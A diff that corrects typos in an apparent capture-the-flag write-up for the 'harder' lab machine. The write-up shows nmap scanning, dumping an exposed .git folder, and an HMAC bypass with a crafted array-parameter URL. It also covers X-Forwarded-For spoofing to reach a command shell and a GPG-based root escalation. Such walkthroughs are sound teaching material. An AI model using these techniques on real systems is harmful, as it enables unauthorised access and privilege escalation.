@@ -9,18 +9,18 @@ We have an IP as usual, and we can start with the basic nmap scan - `nmap -oN nm
 PORT      STATE    SERVICE        REASON      VERSION
 22/tcp    open     ssh            syn-ack     OpenSSH 8.3 (protocol 2.0)
 80/tcp    open     http           syn-ack     nginx 1.18.0
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST
 |_http-server-header: nginx/1.18.0
 |_http-title: Error
 ```
-We have two ports open, one nginx server and another SSH. 
+We have two ports open, one nginx server and another SSH.
 
-So, let's take a step back and red the description of the machine.
+So, let's take a step back and read the description of the machine.
 ```
 Hints to the initial foodhold: Look closely at every request. Re-scan all newly found web services/folders and may use some wordlists from seclists.
 ```
-We have to look closely at every request, so let's do that...and there we find some intersting stuff
+We have to look closely at every request, so let's do that...and there we find some interesting stuff
 ```
 HTTP/1.1 200 OK
 Server: nginx/1.18.0
@@ -38,10 +38,10 @@ Here we can see in the Set-Cookie attribute we have values and a DOMAIN. What we
 ```shell
 $ sudo echo "IP     pwd.harder.local" >> /etc/hosts
 ```
-and visit http://pwd.harder.local in the web browser and this will open up a new page that is asking for credentials. Let's try and bruteforce the creds, by manually trying some creds - admin:admin - gave us some different response. So we will try to bruteforce password using username as `admin` but we didn't get much benefit. 
+and visit http://pwd.harder.local in the web browser and this will open up a new page that is asking for credentials. Let's try and bruteforce the creds, by manually trying some creds - admin:admin - gave us some different responses. So we will try to bruteforce the password using the username as `admin` but we didn't get much benefit.
 Let's try and run gobuster, to see if we get anything, and we get a .git folder and we are supposed to enumerate this directory to get information, let's do it!
 
-In order to dump that .git directory to our local system, this [tool](https://github.com/internetwache/GitTools.git) can be used! Once we have .git directory we can use git commands to look for whatever we have in there.
+In order to dump that .git directory to our local system, this [tool](https://github.com/internetwache/GitTools.git) can be used! Once we have a .git directory we can use git commands to look for whatever we have in there.
 ```shell
 $ ./gitdumper.sh pwd.harder.local/.git/ ~/CTF/thm/harder/git
 ###########
@@ -49,7 +49,7 @@ $ ./gitdumper.sh pwd.harder.local/.git/ ~/CTF/thm/harder/git
 #
 # Developed and maintained by @gehaxelt from @internetwache
 #
-# Use at your own risk. Usage might be illegal in certain circumstances. 
+# Use at your own risk. Usage might be illegal in certain circumstances.
 # Only for educational purposes!
 ###########
 
@@ -81,17 +81,17 @@ drwxrwxr-x 6 cardinal cardinal  4096 Aug 17 02:53 .git
 -rw-rw-r-- 1 cardinal cardinal   608 Aug 17 02:53 index.php
 ```
 
-We have a few intersting files now, with us...let's start with `gitignore` file.
+We have a few interesting files now, with us...let's start with `gitignore` file.
 ```shell
-$ cat .gitignore 
+$ cat .gitignore
 credentials.php
 secret.php
 ```
-And these looks so intersting! Let's keep these aside for a while and let's look at the source code of the files we have!
+And these look so interesting! Let's keep these aside for a while and let's look at the source code of the files we have!
 
-`auth.php` - has some basic cookie setting and stuff...nothing intersting!
-`index.php` - nothing intersting either, but
-`hmac.php` - is what I found out to be most intersting.
+`auth.php` - has some basic cookie setting and stuff...nothing interesting!
+`index.php` - nothing interesting either, but
+`hmac.php` - is what I found out to be most interesting.
 
 
 ```php
@@ -115,9 +115,9 @@ if ($hm !== $_GET['h']){
 ?>
 ```
 
-Studying the code and breaking my head on it, I found out that `hash_hmac` function can be used to out benefit. Accoring to the [function's defintion](https://www.php.net/manual/en/function.hash-hmac.php), this function takes strings as it's parameter and if something is wrong it give us boolean value - false.
+Studying the code and breaking my head on it, I found out that `hash_hmac` function can be used to our benefit. According to the [function's defintion](https://www.php.net/manual/en/function.hash-hmac.php), this function takes strings as it's parameter and if something is wrong it gives us boolean value - false.
 <br><br>
-So, we can force this function to produce to generate false as it's output, using the `n` parameter. If `n` is set then the $secret will contain some value, so using the above information let's see what we can do. And after we get the value for $secret as `false`. We can then bypass other if-else branch and get access to the system using `h` and `host` parameters as such,
+So, we can force this function to generate false as it's output, using the `n` parameter. If `n` is set then the $secret will contain some value, so using the above information let's see what we can do. And after we get the value for $secret as `false`. We can then bypass other if-else branch and get access to the system using `h` and `host` parameters as such,
 <br><br>
 What we have to do is, pass false and generate the value for `$hm` with some hosts, as such
 ```php
@@ -138,18 +138,18 @@ pwd.harder.local/index.php?n[]=0&h=e86f889ce1872bcb2d54e7145c1a4b4d85ee32fdf4223
 ```
 
 And after so much of struggle, we have something,
-|url 	                |username 	|password (cleartext)            |
+|url                     |username     |password (cleartext)            |
 | --------------------- |:---------:|--------------------------------|
-|http://shell.harder.htb| 	evs 	|xxxxxxxxxxxxxxxxxxxxxxxxxx|
+|http://shell.harder.htb|     evs     |xxxxxxxxxxxxxxxxxxxxxxxxxx|
 
-We have a new virtual host and a new set of credentials, let's add this host again into /etc/hosts and see what we have! 
+We have a new virtual host and a new set of credentials, let's add this host again into /etc/hosts and see what we have!
 The above creds don't work on the login page of `pwd.harder.local`, it must only work with the specified url, let's try that!
 
-This virtual hosts doesn't seem to work!!!!! Give same 404 error! Why it's `htb` there in the domain, we can try changing that to `local` and see if that works! Yay!! It works!!!!!
+This virtual host doesn't seem to work!!!!! Gives the same 404 error! Why it's `htb` there in the domain? We can try changing that to `local` and see if that works! Yay!! It works!!!!!
 
 We have a login page and we are into the system with the provided creds. And another hurdle slammed us in our face,
 ```
-Your IP is not allowed to use this webservice. Only 10.10.10.x is allowed
+Your IP is not allowed to use this web service. Only 10.10.10.x is allowed
 ```
 
 We can easily bypass this by using `X-Forwarded-For` to what it says: 10.10.10.x, let x be 100! Mathematical nostalgia! LOL
@@ -172,10 +172,10 @@ Cookie: PHPSESSID=q9hkku720p6bmkt998gcipo1sd
 Connection: close
 X-Forwarded-For: 10.10.10.100
 ```
-And we have a place to execute the shell commands! Let's enumerate the system! 
+And we have a place to execute the shell commands! Let's enumerate the system!
 
 
-In the user(evs)'s directory we get our user flag and now we need to find a way to esclate priviledge. Let do some more enumeration and search for vulnerable stuff.
+In the user(evs)'s directory we get our user flag and now we need to find a way to escalate privilege. Let do some more enumeration and search for vulnerable stuff.
 
 We use find command to search for the stuff that belongs to the user `www` and we got some data and the most interesting was,
 ```shell
@@ -203,7 +203,7 @@ harder:~$ find / -type f -name "*.sh" 2> /dev/null
 
 harder:~$ ls -la /usr/local/bin/run-crypted.sh
 -rwxr-x---    1 root     evs            412 Jul  7 20:58 /usr/local/bin/run-crypted.sh
-harder:~$ 
+harder:~$
 harder:~$ cat /usr/local/bin/run-crypted.sh
 #!/bin/sh
 
@@ -220,8 +220,8 @@ if [ $# -eq 0 ]
 fi
 
 ```
-After reading this script, I think there should be gpg key somewhere and we need to find it, in order to run commands as root.
-```shell 
+After reading this script, I think there should be a gpg key somewhere and we need to find it, in order to run commands as root.
+```shell
 harder:~$ find / -name root@harder.local* 2> /dev/null
 /var/backup/root@harder.local.pub
 ```
@@ -253,13 +253,13 @@ you may answer the next question with yes.
 Use this key anyway? (y/N) y
 harder:~$ ls
 command      command.gpg  nc           user.txt
-harder:~$ execute-crypted command.gpg 
+harder:~$ execute-crypted command.gpg
 gpg: encrypted with 256-bit ECDH key, ID 6C1C04522C049868, created 2020-07-07
       "Administrator <root@harder.local>"
 {root_flag}
 ```
 
-And we get the key! There are a few concepts that were complicated but this one was really great learning experience! Loved it! 
+And we get the key! There are a few concepts that are complicated but this one was a really great learning experience! Loved it!
 
 Machine Pwned!
 
